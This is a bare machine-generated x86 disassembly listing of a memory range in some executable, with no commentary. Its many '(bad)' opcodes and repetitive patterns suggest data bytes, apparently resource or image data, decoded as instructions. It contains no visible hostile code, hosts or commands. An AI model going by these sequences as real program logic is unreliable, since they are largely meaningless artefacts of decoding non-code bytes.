  405145:	add    BYTE PTR [eax],al
  405147:	add    edi,edi
  405149:	add    BYTE PTR [eax],al
  40514b:	add    edi,edi
  40514d:	add    BYTE PTR [eax],0x3
  405150:	inc    DWORD PTR [eax-0x700000f9]
  405156:	(bad)  
  405157:	(bad)  
  405158:	(bad)  
  405159:	(bad)  
  40515a:	(bad)  
  40515b:	(bad)  
  40515c:	(bad)  
  40515d:	(bad)  
  40515e:	(bad)  
  40515f:	jmp    FWORD PTR [eax]
  405161:	add    BYTE PTR [eax],al
  405163:	add    BYTE PTR [eax],dl
  405165:	add    BYTE PTR [eax],al
  405167:	add    BYTE PTR [eax],ah
  405169:	add    BYTE PTR [eax],al
  40516b:	add    BYTE PTR [ecx],al
  40516d:	add    BYTE PTR [eax+eax*1],al
  405170:	add    BYTE PTR [eax],al
  405172:	add    BYTE PTR [eax],al
  405174:	add    BYTE PTR [eax],0x0
	...
  40518b:	add    BYTE PTR [eax],al
  40518d:	add    BYTE PTR [eax+0x800000],al
  405193:	add    BYTE PTR [eax],al
  405195:	add    BYTE PTR [eax+0x8000],0x0
  40519c:	add    BYTE PTR [eax],0x80
  40519f:	add    BYTE PTR [eax-0x7fffff80],al
  4051a5:	add    BYTE PTR [eax-0x3f3f4000],0x0
  4051ac:	add    BYTE PTR [eax],al
  4051ae:	inc    DWORD PTR [eax]
  4051b0:	add    bh,bh
  4051b2:	add    BYTE PTR [eax],al
  4051b4:	add    bh,bh
  4051b6:	inc    DWORD PTR [eax]
  4051b8:	inc    DWORD PTR [eax]
  4051ba:	add    BYTE PTR [eax],al
  4051bc:	inc    DWORD PTR [eax]
  4051be:	inc    DWORD PTR [eax]
  4051c0:	(bad)  
  4051c1:	inc    DWORD PTR [eax]
  4051c3:	add    bh,bh
  4051c5:	(bad)  
  4051c6:	inc    DWORD PTR [eax]
	...
  4051d0:	ja     0x405242
  4051d2:	add    BYTE PTR [eax+0x808787],cl
  4051d8:	xchg   DWORD PTR [eax-0x78770800],eax
  4051de:	add    BYTE PTR [eax],al
  4051e0:	mov    BYTE PTR [eax+0x70870000],al
  4051e6:	add    BYTE PTR [eax],al
  4051e8:	mov    BYTE PTR [eax-0x77777778],cl
  4051ee:	js     0x405268
  4051f0:	mov    BYTE PTR [eax-0x77777778],cl
  4051f6:	mov    BYTE PTR [eax-0x3b7b7778],cl
  4051fc:	inc    edi
  4051fd:	int3   
  4051fe:	(bad)  
  4051ff:	mov    BYTE PTR [eax-0x78837b78],cl
  405205:	(bad)  
  405206:	int3   
  405207:	mov    BYTE PTR [edx-0x307988],cl
  40520d:	mov    WORD PTR [esi-0x7a877e78],es
  405213:	push   0x88c8f7c7
  405218:	mov    BYTE PTR [edi-0x70333384],cl
  40521e:	into   
  40521f:	mov    BYTE PTR [eax],al
  405221:	or     BYTE PTR [esi+eax*8-0x77733032],al
  405228:	add    BYTE PTR [eax],cl
  40522a:	mov    esp,cs
  40522c:	enter  0xe777,0x88
  405230:	add    BYTE PTR [eax],cl
  405232:	xchg   DWORD PTR [eax-0x77777788],ecx
  405238:	add    BYTE PTR [eax],cl
  40523a:	mov    BYTE PTR [eax-0x70777778],cl
	...
  405248:	(bad)  
  405249:	inc    DWORD PTR [eax]
  40524b:	add    BYTE PTR [edi+eax*1],bl
  40524e:	add    BYTE PTR [eax],al
  405250:	sbb    al,0xf
  405252:	add    BYTE PTR [eax],al
  405254:	pop    ds
  405255:	pop    ds
	...
  405272:	add    BYTE PTR [eax],al
  405274:	loopne 0x405276
  405276:	add    BYTE PTR [eax],al
  405278:	loopne 0x40527a
  40527a:	add    BYTE PTR [eax],al
  40527c:	loopne 0x40527e
  40527e:	add    BYTE PTR [eax],al
  405280:	loopne 0x405282
  405282:	add    BYTE PTR [eax],al
  405284:	(bad)  
  405285:	inc    DWORD PTR [eax]
  405287:	add    BYTE PTR [eax],ch
  405289:	add    BYTE PTR [eax],al
  40528b:	add    BYTE PTR [eax],dh
  40528d:	add    BYTE PTR [eax],al
  40528f:	add    BYTE PTR [eax+0x0],ah
  405292:	add    BYTE PTR [eax],al
  405294:	add    DWORD PTR [eax],eax
  405296:	or     BYTE PTR [eax],al
  405298:	add    BYTE PTR [eax],al
  40529a:	add    BYTE PTR [eax],al
  40529c:	add    BYTE PTR [ecx],cl
	...
  4052a6:	add    BYTE PTR [eax],al
  4052a8:	add    BYTE PTR [ecx],al
  4052aa:	add    BYTE PTR [eax],al
  4052ac:	add    BYTE PTR [ecx],al
  4052ae:	add    BYTE PTR [eax],al
  4052b0:	add    BYTE PTR [eax],al
  4052b2:	add    BYTE PTR [eax],al
  4052b4:	daa    
  4052b5:	add    BYTE PTR [edx],al
  4052b7:	add    BYTE PTR [eax+eax*1+0x0],bh
  4052bb:	add    BYTE PTR [edx+0x18],bh
  4052be:	or     eax,0x1a237c00
  4052c3:	add    BYTE PTR [edi+0x30],bh
  4052c6:	daa    
  4052c7:	add    BYTE PTR [esi],al
  4052c9:	push   esp
  4052ca:	sbb    eax,DWORD PTR [eax]
  4052cc:	dec    esi
  4052cd:	dec    esi
  4052ce:	dec    esi
  4052cf:	add    BYTE PTR [ebx+ecx*2+0x43],dl
  4052d3:	add    BYTE PTR [ebp+0x5e],bl
  4052d6:	pop    esi
  4052d7:	add    BYTE PTR [ebx+0x44],ah
  4052da:	push   ebp
  4052db:	add    BYTE PTR [ebx+0x63],ah
  4052de:	arpl   WORD PTR [eax],ax
  4052e0:	push   0x66006564
  4052e5:	addr16 push 0x6a6a6a00
  4052eb:	add    BYTE PTR [ebp+ebp*2+0x6c],bh
  4052ef:	add    BYTE PTR [ecx+0x71],dh
  4052f2:	jno    0x4052f4
  4052f4:	jge    0x405368
  4052f6:	je     0x4052f8
  4052f8:	js     0x405372
  4052fa:	ja     0x4052fc
  4052fc:	jnp    0x405379
  4052fe:	jnp    0x405300
  405300:	mov    BYTE PTR [edi],al
  405302:	add    BYTE PTR [eax],al
  405304:	xchg   esi,eax
  405305:	or     al,BYTE PTR [eax]
  405307:	add    BYTE PTR [ecx-0x66fff6ed],cl
  40530d:	adc    al,BYTE PTR [eax+eax*1]
  405310:	lea    ebx,[edx*1+0x111a9000]
  405317:	add    BYTE PTR [eax+ecx*1+0xab60000],ah
  40531e:	add    BYTE PTR [eax],al
  405320:	test   al,0x15
  405322:	add    DWORD PTR [eax],eax
  405324:	mov    eax,0xb4000018
  405329:	sbb    DWORD PTR [ebx],edx
  40532b:	add    BYTE PTR [ebx-0x68ffe3dc],cl
  405331:	es sbb al,0x0
  405334:	lods   al,BYTE PTR ds:[esi]
  405335:	and    BYTE PTR [eax+eax*1],cl
  405338:	mov    ebp,0xaa000c22
  40533d:	daa    
  40533e:	pop    ss
  40533f:	add    BYTE PTR [ebx-0x47ffe8d6],dh
  405345:	xor    DWORD PTR ds:0x262b9700,ebx
  40534b:	add    BYTE PTR [ebp-0x69ffd6ce],al
  405351:	xor    eax,0x3c8b002d
  405356:	add    BYTE PTR ss:[eax-0x46ffccc7],bl
  40535d:	aaa    
  40535e:	add    BYTE PTR es:[esi-0x39ffcdc4],ah
  405365:	sbb    eax,DWORD PTR [eax]
  405367:	add    ah,dl
  405369:	sbb    eax,DWORD PTR [eax]
  40536b:	add    cl,dh
  40536d:	or     eax,DWORD PTR [eax]
  40536f:	add    cl,ch
  405371:	sbb    al,BYTE PTR [eax]
  405373:	add    dl,al
  405375:	and    ecx,DWORD PTR [ecx]
  405377:	add    bh,dl
  405379:	and    al,BYTE PTR [eax]
  40537b:	add    bh,al
  40537d:	cs adc al,0x0
  405380:	out    0x23,al
  405382:	add    BYTE PTR [eax],al
  405384:	repz and al,0x0
  405387:	add    dh,ah
  405389:	cmp    eax,0x37f5001d
  40538e:	adc    DWORD PTR [eax],eax
  405390:	les    edi,FWORD PTR ds:0x3bd1002a
  405396:	and    al,BYTE PTR [eax]
  405398:	fwait
  405399:	inc    edx
  40539a:	add    BYTE PTR ss:[edx+eax*2+0x43bc003a],ah
  4053a2:	xor    eax,DWORD PTR [eax]
  4053a4:	mov    DWORD PTR [edx+0x2c],0x3448c900
  4053ab:	add    dh,dl
  4053ad:	dec    esi
  4053ae:	aaa    
  4053af:	add    dl,cl
  4053b1:	push   ecx
  4053b2:	ds add dh,dh
  4053b5:	push   esi
  4053b6:	xor    al,0x0
  4053b8:	xchg   esp,eax
  4053b9:	dec    esp
  4053ba:	inc    edi
  4053bb:	add    BYTE PTR [ecx-0x59ffadaa],bl
  4053c1:	dec    edx
  4053c2:	inc    esi
  4053c3:	add    BYTE PTR [ecx-0x4bffb7b0],ch
  4053c9:	push   ecx
  4053ca:	inc    esp
  4053cb:	add    BYTE PTR [ebp-0x4dffada7],ch
  4053d1:	pop    esp
  4053d2:	push   ebp
  4053d3:	add    BYTE PTR [ebp-0x57ffa69f],bl
  4053d9:	pusha  
  4053da:	pop    ebp
  4053db:	add    BYTE PTR [esi-0x76ffa69d],dh
  4053e1:	fs popa 
  4053e3:	add    BYTE PTR [edi-0x63ff9a9a],dl
  4053e9:	jno    0x405458
  4053eb:	add    BYTE PTR [esi-0x56ff8f8b],bl
  4053f1:	push   0x61
  4053f3:	add    BYTE PTR [edi-0x57ff9592],dh
  4053f9:	jb     0x405464
  4053fb:	add    BYTE PTR [ecx-0x58ff948c],bh
  405401:	jg     0x40547d
  405403:	add    BYTE PTR [esi-0x37ff8d86],bh
  405409:	push   ebp
  40540a:	inc    esp
  40540b:	add    ah,dl
  40540d:	pop    ecx
  40540e:	inc    ebp
  40540f:	add    ah,ah
  405411:	pop    edi
  405412:	inc    edi
  405413:	add    dh,cl
  405415:	pusha  
  405416:	dec    esi
  405417:	add    ah,dl
  405419:	pusha  
  40541a:	dec    ebp
  40541b:	add    cl,cl
  40541d:	addr16 pop eax
  40541f:	add    dl,bl
  405421:	push   0x6ce50054
  405426:	push   esi
  405427:	add    bl,ah
  405429:	jb     0x405488
  40542b:	add    dh,dh
  40542d:	jb     0x405487
  40542f:	add    al,cl
  405431:	jbe    0x40549d
  405433:	add    dh,bl
  405435:	js     0x40549e
  405437:	add    dh,dl
  405439:	jg     0x4054ac
  40543b:	add    dh,ah
  40543d:	jnp    0x4054a7
  40543f:	add    BYTE PTR [esi],bh
  405441:	xchg   esp,eax
  405442:	add    BYTE PTR [si],dh
  405445:	int    0x7e
  405447:	add    BYTE PTR [eax],al
  405449:	jmp    FWORD PTR [ebx+0x0]
  40544c:	test   BYTE PTR [eax-0x7c52ff82],al
  405452:	jl     0x405454
  405454:	mov    BYTE PTR [edx+edi*2+0x6c81eb00],0x0
  40545c:	hlt    
  40545d:	sub    DWORD PTR [edx+0x0],0x7587ea
  405464:	cmc    
  405465:	lea    edi,[ecx+0x0]
  405468:	clc    
  405469:	xchg   ecx,eax
  40546a:	jl     0x40546c
  40546c:	jg     0x4054ed
  40546e:	add    DWORD PTR [eax],0x807f9c
  405474:	jg     0x4053f7
  405476:	add    DWORD PTR [eax],0x91a37a
  40547c:	je     0x405435
  40547e:	fwait
  40547f:	add    BYTE PTR [ecx-0x25],ah
  405482:	pushf  
  405483:	add    BYTE PTR [ebx+eax*4-0x7a7aff7c],al
  40548a:	mov    DWORD PTR [eax],eax
  40548c:	mov    BYTE PTR [edi-0x7474ff76],al
  405492:	mov    WORD PTR [eax],es
  405494:	popf   
  405495:	mov    DWORD PTR [edx-0x706e7000],ecx
  40549b:	add    BYTE PTR [ebp+ecx*4-0x706dff6e],cl
  4054a2:	xchg   ebp,eax
  4054a3:	add    BYTE PTR [ebx-0x6cff686d],cl
  4054a9:	xchg   ebx,eax
  4054aa:	xchg   ebx,eax
  4054ab:	add    BYTE PTR [eax-0x6cff6869],bl
  4054b1:	xchg   edi,eax
  4054b2:	fwait
  4054b3:	add    BYTE PTR [eax-0x6aff646a],bl
  4054b9:	cdq    
  4054ba:	popf   
  4054bb:	add    BYTE PTR [ebx-0x56ff6466],bl
  4054c1:	mov    ecx,DWORD PTR [eax-0x7f784800]
  4054c7:	add    BYTE PTR [ebx-0x5bff746e],ah
  4054cd:	pushf  
  4054ce:	fwait
  4054cf:	add    BYTE PTR [ebp-0x6aff6b69],dh
  4054d5:	test   eax,0xa0a4009d
  4054da:	lahf   
  4054db:	add    BYTE PTR [eax-0x66ff625f],bh
  4054e1:	popf   
  4054e2:	mov    ds:0xa09ca900,al
  4054e7:	add    BYTE PTR [eax-0x6eff5359],bl
  4054ed:	mov    ebx,0xa3a300a7
  4054f2:	mov    ds:0xa5a5a800,eax
  4054f7:	add    BYTE PTR [ecx-0x5bff5857],ch
  4054fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054fe:	stos   BYTE PTR es:[edi],al
  4054ff:	add    BYTE PTR [eax+ebp*4-0x5453ff54],ah
  405506:	lods   al,BYTE PTR ds:[esi]
  405507:	add    BYTE PTR [eax-0x46ff5c5c],dh
  40550d:	mov    ds:0xa9bc00a0,al
  405512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405513:	add    BYTE PTR [ebx-0x4eff5759],dh
  405519:	lods   al,BYTE PTR ds:[esi]
  40551a:	lods   al,BYTE PTR ds:[esi]
  40551b:	add    BYTE PTR [edx-0x4dff5454],bh
  405521:	mov    al,0xae
  405523:	add    BYTE PTR [edi+ebp*4-0x5254ff4d],ah
  40552a:	mov    al,0x0
  40552c:	mov    cl,0xaf
  40552e:	mov    al,0x0
  405530:	mov    esp,0xa300b4ae
  405535:	mov    al,0xb4
  405537:	add    BYTE PTR [eax-0x56ff484e],ch
  40553d:	mov    dh,0xbc
  40553f:	add    BYTE PTR [esi-0x4bff4446],ch
  405545:	mov    bl,0xb3
  405547:	add    BYTE PTR [ebx-0x43ff4c4d],bh
  40554d:	mov    eax,0xb6b000b5
  405552:	mov    edx,0xbab9b500
  405557:	add    BYTE PTR [ebx-0x3bff4446],bh
  40555d:	nop
  40555e:	mov    DWORD PTR [eax],eax
  405560:	(bad)  
  405561:	call   0x85:0x95ea0091
  405568:	neg    BYTE PTR [ecx-0x6012ff79]
  40556e:	nop
  40556f:	add    al,cl
  405571:	mov    ds:0xa8db009e,eax
  405576:	fwait
  405577:	add    al,ch
  405579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40557a:	mov    es,WORD PTR [eax]
  40557c:	cmc    
  40557d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40557e:	mov    es,WORD PTR [eax]
  405580:	jmp    0x98a8:0xf80094a5
  405587:	add    bl,ch
  405589:	mov    ch,0x9e
  40558b:	add    bl,bh
  40558d:	mov    bl,0x95
  40558f:	add    ah,al
  405591:	stos   BYTE PTR es:[edi],al
  405592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405593:	add    bl,bl
  405595:	lods   al,BYTE PTR ds:[esi]
  405596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405597:	add    dh,al
  405599:	mov    dl,0xac
  40559b:	add    dh,dl
  40559d:	mov    dh,0xac
  40559f:	add    ch,al
  4055a1:	test   eax,0xb0c600b6
  4055a6:	mov    al,0x0
  4055a8:	leave  
  4055a9:	mov    eax,0xbcc300b6
  4055ae:	mov    esp,0xbcbdcc00
  4055b3:	add    cl,dl
  4055b5:	mov    ebp,0xbae800ba
  4055ba:	test   eax,0xa6b7fd00
  4055bf:	add    ch,bh
  4055c1:	mov    edi,0xc1b900b3
  4055c6:	mov    esi,0xb8c1da00
  4055cb:	add    dh,bh
  4055cd:	ret    
  4055ce:	stos   DWORD PTR es:[edi],eax
  4055cf:	add    bh,ah
  4055d1:	lds    edi,FWORD PTR [eax-0x49370300]
  4055d7:	add    bh,bh
  4055d9:	sar    DWORD PTR [ebp-0x3d425200],1
  4055df:	add    BYTE PTR [edi-0x3cff3d41],dh
  4055e5:	mov    ebp,0xc2ba00c1
  4055ea:	ret    
  4055eb:	add    BYTE PTR [ebx-0x44ff373d],dh
  4055f1:	(bad)  
  4055f2:	leave  
  4055f3:	add    BYTE PTR [edi-0x44ff3438],dh
  4055f9:	retf   0xcd
  4055fc:	ret    
  4055fd:	ret    
  4055fe:	les    eax,FWORD PTR [eax]
  405600:	retf   
  405601:	(bad)  
  405602:	lds    eax,FWORD PTR [eax]
  405604:	iret   
  405605:	enter  0xc7,0xc4
  405609:	(bad)  
  40560a:	leave  
  40560b:	add    ah,cl
  40560d:	(bad)  
  40560e:	enter  0xc100,0xc9
  405612:	retf   
  405613:	add    bl,cl
  405615:	retf   
  405616:	retf   
  405617:	add    ch,dl
  405619:	retf   0xc7
  40561c:	(bad)  
  40561d:	ror    edi,1
  40561f:	add    ch,al
  405621:	into   
  405622:	rol    BYTE PTR [eax],cl
  405624:	iret   
  405625:	iret   
  405626:	rol    BYTE PTR [eax],1
  405628:	(bad)
  40562b:	add    ch,cl
  40562d:	rcl    ah,cl
  40562f:	add    dh,cl
  405631:	(bad)  
  405632:	fadd   DWORD PTR [eax]
  405634:	retf   0xdcda
  405637:	add    dl,dl
  405639:	rcl    ebx,cl
  40563b:	add    dl,bl
  40563d:	aam    0xd3
  40563f:	add    ah,dl
  405641:	xlat   BYTE PTR ds:[ebx]
  405642:	fadd   DWORD PTR [eax]
  405644:	aam    0xd9
  405646:	fild   DWORD PTR [eax]
  405648:	fcmovnu st,st(3)
  40564a:	fild   DWORD PTR [eax]
  40564c:	dec    dh
  40564e:	les    eax,FWORD PTR [eax]
  405650:	in     eax,dx
  405651:	xlat   BYTE PTR ds:[ebx]
  405652:	int    0x0
  405654:	(bad)  
  405655:	(bad)  
  405656:	mov    DWORD PTR [eax],0xd2dcfe
  40565c:	jmp    esp
  40565e:	fiadd  DWORD PTR [eax]
  405660:	into   
  405661:	fsubrp st(1),st
  405663:	add    bl,dl
  405665:	fsubrp st(1),st
  405667:	add    dl,bl
  405669:	(bad)  
  40566b:	add    cl,bl
  40566d:	loop   0x405652
  40566f:	add    dl,ah
  405671:	jecxz  0x405656
  405673:	add    cl,ch
  405675:	out    0xe6,eax
  405677:	add    cl,ah
  405679:	out    0xea,eax
  40567b:	add    bh,ah
  40567d:	jmp    0xec2b576b
  405682:	jmp    0x405684
  405684:	(bad)  
  405685:	jmp    0x40566c
  405687:	add    bh,bh
  405689:	lock jmp 0xee00:0xf0eee700
  405691:	repnz cmc 
  405693:	add    bl,dh
  405695:	hlt    
  405696:	hlt    
  405697:	add    bh,bh
  405699:	cmc    
  40569a:	lock add dh,dh
  40569d:	clc    
  40569e:	stc    
  40569f:	add    dh,bh
  4056a1:	(bad)  
  4056a2:	inc    BYTE PTR [eax]
	...
  4056ac:	(bad)  
  4056ad:	(bad)  
  4056ae:	inc    DWORD PTR [eax]
	...
  405758:	add    ch,bl
  40575a:	fstp   st(5)
  40575c:	fstp   st(5)
  40575e:	stos   BYTE PTR es:[edi],al
  40575f:	int    0x0
	...
  405785:	add    ch,bl
  405787:	fstp   st(5)
  405789:	lock icebp 
  40578b:	lock lock out 0xe6,al
  40578f:	out    0xdd,al
  405791:	rcl    DWORD PTR [ebp+0xd3],cl
	...
  4057b3:	add    BYTE PTR [edx-0x19192223],ch
  4057b9:	out    0xe6,al
  4057bb:	in     al,0xdd
  4057bd:	fstp   st(5)
  4057bf:	lock out 0xd3,al
  4057c2:	stos   BYTE PTR es:[edi],al
  4057c3:	fst    QWORD PTR [ebp+0x95]
	...
  4057e1:	add    bl,dl
  4057e3:	fstp   st(5)
  4057e5:	fstp   st(5)
  4057e7:	fucom  st(6)
  4057e9:	out    0xe6,al
  4057eb:	out    0xdd,al
  4057ed:	fstp   st(5)
  4057ef:	lock fstp QWORD PTR [ebx+edx*8-0x7c2c552a]
	...
  40580f:	add    BYTE PTR [eax],al
  405811:	fst    st(3)
  405813:	ror    ebp,cl
  405815:	(bad)  
  405816:	(bad)  
  405818:	fucom  st(6)
  40581a:	out    0xf0,al
  40581c:	fstp   st(1)
  40581e:	(bad)  
  405820:	int    0xd3
  405822:	fldenv [ebp+0x78d39595]
	...
  405840:	add    BYTE PTR [edi-0x29325556],ah
  405846:	(bad)  
  405848:	out    0xe6,al
  40584a:	out    0xe6,al
  40584c:	fstp   st(1)
  40584e:	aad    0xdd
  405850:	(bad)
  405853:	pushf  
  405854:	xchg   edx,eax
  405855:	adc    DWORD PTR [eax+0x8a],0x0
	...
  405870:	add    BYTE PTR [edx-0x403a5557],ch
  405876:	int    0xd9
  405878:	(bad)  
  40587a:	out    0xdd,al
  40587c:	fst    st(3)
  40587e:	(bad)  
  40587f:	int    0xc5
  405881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405882:	xchg   ebp,eax
  405883:	nop
  405884:	jle    0x405900
  405886:	nop
  405887:	nop
	...
  4058a0:	add    ch,bl
  4058a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058a3:	stos   BYTE PTR es:[edi],al
  4058a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058a5:	(bad)
  4058a8:	(bad)  
  4058aa:	(bad)  
  4058ac:	fxch   st(5)
  4058ae:	int    0xa7
  4058b0:	pushf  
  4058b1:	nop
  4058b2:	jle    0x40592e
  4058b4:	jp     0x405935
  4058b6:	lahf   
  4058b7:	jle    0x4058b9
	...
  4058c1:	add    BYTE PTR [eax],al
  4058c3:	outs   dx,DWORD PTR ds:[esi]
  4058c4:	jp     0x405935
	...
  4058d2:	xchg   ebp,eax
  4058d3:	fst    st(3)
  4058d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058d6:	test   eax,0xcdc5cdc5
  4058db:	mov    edi,0x7f909ca9
  4058e0:	jne    0x4058f2
  4058e2:	or     eax,0x95907e71
  4058e7:	nop
  4058e8:	add    BYTE PTR [eax+0xd3],dl
  4058ee:	add    BYTE PTR [eax],al
  4058f0:	add    BYTE PTR [eax],al
  4058f2:	push   cs
  4058f3:	pushf  
  4058f4:	xor    eax,0xffffffe4
  4058f7:	or     al,0xe
  4058f9:	pop    es
  4058fa:	or     al,0x90
  4058fc:	outs   dx,DWORD PTR ds:[esi]
  4058fd:	add    BYTE PTR [eax],al
  4058ff:	add    BYTE PTR [eax],al
  405901:	add    BYTE PTR [eax],al
  405903:	nop
  405904:	xchg   ebp,eax
  405905:	(bad)  
  405906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405907:	pushf  
  405908:	nop
  405909:	nop
  40590a:	nop
  40590b:	jg     0x405984
  40590d:	adc    edx,DWORD PTR [eax]
  40590f:	or     eax,0x83750d09
  405914:	xchg   ebp,eax
  405915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405916:	stos   BYTE PTR es:[edi],al
  405917:	stos   BYTE PTR es:[edi],al
  405918:	out    0xe6,al
  40591a:	nop
  40591b:	add    BYTE PTR [eax],al
  40591d:	add    BYTE PTR [eax],al
  40591f:	add    BYTE PTR [eax],al
  405921:	(bad)  
  405922:	pushf  
  405923:	xchg   ecx,eax
  405924:	jle    0x4058bf
  405926:	fst    st(3)
  405928:	jle    0x4059a2
  40592a:	adc    BYTE PTR [edi-0x23],bh
  40592d:	int    0x13
  40592f:	add    BYTE PTR [eax],al
  405931:	add    BYTE PTR [eax],al
  405933:	add    BYTE PTR [eax],al
  405935:	jle    0x4059b6
  405937:	nop
  405938:	xchg   edx,eax
  405939:	nop
  40593a:	adc    edx,DWORD PTR [bp+si]
  40593d:	adc    esi,DWORD PTR [ecx+0x77]
  405940:	mov    dl,BYTE PTR [esp+ebx*4-0x315a5661]
  405947:	(bad)  
  405949:	mov    edi,0x90
  40594e:	add    BYTE PTR [eax],al
  405950:	add    bl,dl
  405952:	xchg   ecx,eax
  405953:	pushf  
  405954:	sbb    DWORD PTR [edi-0x566a6a23],0x78
  40595b:	push   cs
  40595c:	jno    0x4059dd
  40595e:	(bad)  [edx+0x71]
  405964:	add    BYTE PTR [eax],al
  405966:	add    BYTE PTR [eax],al
  405968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405969:	jg     0x4059e2
  40596b:	ja     0x4059e7
  40596d:	jp     0x4059ee
  40596f:	mov    dl,BYTE PTR [ebp+ebx*4-0x131e2e5c]
  405976:	in     al,0xda
  405978:	fst    st(3)
  40597a:	xchg   ebp,eax
  40597b:	add    BYTE PTR [eax],al
  40597d:	add    BYTE PTR [eax],al
  40597f:	add    BYTE PTR [eax],al
  405981:	xlat   BYTE PTR ds:[ebx]
  405982:	xchg   ebp,eax
  405983:	pushf  
  405984:	xchg   ecx,eax
  405985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405986:	int    0xa9
  405988:	stos   BYTE PTR es:[edi],al
  405989:	pushf  
  40598a:	(bad)  
  40598c:	xchg   edx,eax
  40598d:	adc    ch,BYTE PTR [edi+0x7a]
  405990:	stc    
  405991:	nop
  405992:	jne    0x405994
  405994:	add    BYTE PTR [eax],al
  405996:	lahf   
  405997:	mov    WORD PTR [esi+0x78],?
  40599a:	js     0x405a16
  40599c:	jge    0x405a1b
  40599e:	mov    cs,ebx
  4059a0:	(bad)  
  4059a2:	(bad)  
  4059a3:	mov    ecx,0x1e2d3e62
  4059a8:	cwde   
  4059a9:	loope  0x40593b
  4059ab:	fld    QWORD PTR [eax]
  4059ad:	add    BYTE PTR [eax],al
  4059af:	add    BYTE PTR [eax],al
  4059b1:	shl    DWORD PTR [eax-0x55586359],cl
  4059b7:	js     0x40593c
  4059b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059bb:	int    0xf4
  4059bd:	stc    
  4059be:	jp     0x4059cc
  4059c0:	or     eax,0x90908377
  4059c5:	mov    WORD PTR [eax-0x5e717d81],es
  4059cb:	lahf   
  4059cc:	pushf  
  4059cd:	mov    ebp,0x245b69b0
  4059d2:	sbb    ebx,DWORD PTR [edx]
  4059d4:	sbb    bl,BYTE PTR [edx+ebx*1]
  4059d7:	sbb    al,0x8b
  4059d9:	loope  0x405970
  4059db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059dc:	add    BYTE PTR [eax],al
  4059de:	add    BYTE PTR [eax],al
  4059e0:	add    dh,dl
  4059e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059e3:	mov    edi,0x8ccdcd99
  4059e8:	jg     0x405a68
  4059ea:	jg     0x405a6a
  4059ec:	jle    0x405a6d
  4059ee:	jg     0x40597c
  4059f0:	xchg   ebx,eax
  4059f1:	xchg   esp,eax
  4059f2:	popf   
  4059f3:	mov    ds:0x99a4cba2,al
  4059f8:	cwde   
  4059f9:	stos   DWORD PTR es:[edi],eax
  4059fa:	push   ecx
  4059fb:	inc    esi
  4059fc:	and    DWORD PTR [edx],ebx
  4059fe:	sbb    bl,BYTE PTR [edx]
  405a00:	sbb    ah,BYTE PTR [ecx]
  405a02:	and    esp,DWORD PTR [ebx]
  405a04:	and    al,0x23
  405a06:	and    DWORD PTR [edx],esp
  405a08:	stos   DWORD PTR es:[edi],eax
  405a09:	in     al,dx
  405a0a:	pushf  
  405a0b:	xchg   ebp,eax
  405a0c:	add    BYTE PTR [eax],al
  405a0e:	add    BYTE PTR [eax],al
  405a10:	add    bl,dl
  405a12:	int    0xcd
  405a14:	xchg   ebp,eax
  405a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a16:	test   eax,0x7a838a83
  405a1b:	jle    0x405a97
  405a1d:	jb     0x4059ab
  405a1f:	mov    eax,ds:0x98d3d2ce
  405a24:	test   DWORD PTR [ecx+0x44],edx
  405a27:	es adc eax,0x15141414
  405a2d:	pop    ss
  405a2e:	and    esp,DWORD PTR ds:0x25242523
  405a34:	and    eax,0x69222525
  405a39:	in     al,dx
  405a3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a3b:	xchg   ebp,eax
  405a3c:	add    BYTE PTR [eax],al
  405a3e:	add    BYTE PTR [eax],al
  405a40:	add    dh,dl
  405a42:	aam    0xd4
  405a44:	pushf  
  405a45:	stos   BYTE PTR es:[edi],al
  405a46:	int    0x83
  405a48:	mov    bl,BYTE PTR [edi-0x34347d81]
  405a4e:	pushf  
  405a4f:	test   BYTE PTR [edx+0x44],cl
  405a52:	es push ss
  405a54:	add    al,BYTE PTR [edx]
  405a56:	add    al,BYTE PTR [edx]
  405a58:	adc    al,0x15
  405a5a:	sbb    bl,BYTE PTR [edx]
  405a5c:	pop    ss
  405a5d:	and    al,0x2b
  405a5f:	sub    ebp,DWORD PTR [ebx]
  405a61:	sub    edi,DWORD PTR [eax]
  405a63:	cmp    BYTE PTR [eax],bh
  405a65:	cmp    eax,0xec60333d
  405a6a:	stos   BYTE PTR es:[edi],al
  405a6b:	nop
  405a6c:	add    BYTE PTR [eax],al
  405a6e:	add    BYTE PTR [eax],al
  405a70:	add    bl,dl
  405a72:	(bad)  
  405a74:	pushf  
  405a75:	stos   BYTE PTR es:[edi],al
  405a76:	stos   BYTE PTR es:[edi],al
  405a77:	nop
  405a78:	nop
  405a79:	lahf   
  405a7a:	popf   
  405a7b:	jns    0x405aa6
  405a7d:	es push ss
  405a7f:	adc    al,0x2
  405a81:	add    al,BYTE PTR [edx]
  405a83:	add    al,BYTE PTR [edx]
  405a85:	push   ss
  405a86:	adc    eax,0x3041517
  405a8b:	pop    ss
  405a8c:	sbb    al,0x25
  405a8e:	cmp    al,0x3c
  405a90:	cmp    al,0x3e
  405a92:	ds ds ds aas 
  405a96:	aas    
  405a97:	cmp    DWORD PTR [eax-0x22],esp
  405a9a:	(bad)  
  405a9b:	nop
  405a9c:	add    BYTE PTR [eax],al
  405a9e:	add    BYTE PTR [eax],al
  405aa0:	add    ah,dl
  405aa2:	aad    0xd5
  405aa4:	lahf   
